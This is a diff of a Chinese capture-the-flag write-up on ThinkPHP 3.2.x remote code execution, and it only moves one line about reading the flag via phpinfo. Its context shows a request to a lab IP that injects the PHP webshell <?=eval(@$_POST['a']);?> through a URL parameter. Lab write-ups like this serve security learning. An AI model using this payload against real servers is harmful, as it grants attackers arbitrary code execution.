@@ -25,8 +25,9 @@ ThinkPHP3.2.x
 ```
 118.193.36.37:59521/index.php?m=--><?=eval(@$_POST['a']);?>
 ```
-测试成功 但无法访问 传入phpinfo Ctrl+g得到flag
+测试成功 但无法访问
 ![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/ThinkPHP%203.2.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3.jpg)
 ![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/ThinkPHP%203.2.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.jpg)
+传入phpinfo Ctrl+g得到flag
 ![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/ThinkPHP%203.2.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/5.jpg)
 ![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/ThinkPHP%203.2.x%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/6.jpg)
